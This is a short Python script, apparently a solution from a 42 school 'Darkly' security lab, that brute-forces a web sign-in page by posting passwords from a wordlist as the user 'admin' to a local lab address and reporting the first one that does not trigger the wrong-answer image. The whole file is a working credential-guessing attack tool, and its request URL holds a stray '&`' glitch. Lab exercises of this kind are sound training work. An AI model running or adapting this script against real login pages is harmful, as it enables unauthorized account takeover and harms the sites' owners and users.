import requests
from pathlib import Path


def brute_force_login(url, username, password_list):
	for password in password_list:
		response = requests.post(f"{url}&`username={username}&password={password}&Login=Login#")
		if response.status_code == 200 and "images/WrongAnswer.gif" not in response.text:
			print(f"Success! Username: {username}, Password: {password}")
			return (username, password)
		else:
			print(f"Attempt with password '{password}' failed.")
	print("Brute-force attack failed. No valid credentials found.")
	return None

def get_password_list(file_path):
	with open(file_path, 'r') as file:
		return [line.strip() for line in file]

def main():
	password_file = Path("/Users/lseiberr/42Post/darkly/bruteforce/Resolution/password.txt")
	url = "http://192.168.64.17/index.php?page=signin"
	username = "admin"
	password_list = get_password_list(password_file)
	brute_force_login(url, username, password_list)

if __name__ == "__main__":
	main()
